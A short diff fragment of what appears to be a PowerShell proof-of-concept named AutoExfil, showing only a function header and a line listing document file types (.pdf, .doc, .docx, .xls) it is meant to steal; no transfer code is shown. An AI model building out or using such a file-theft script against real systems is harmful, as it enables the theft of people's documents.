@@ -1,3 +1,4 @@
+#AutoExfil PoC
 function Invoke-AutoExfil
 {
     $steal = ".pdf", ".doc", ".docx", ".xls" #Define what file types you want to steal
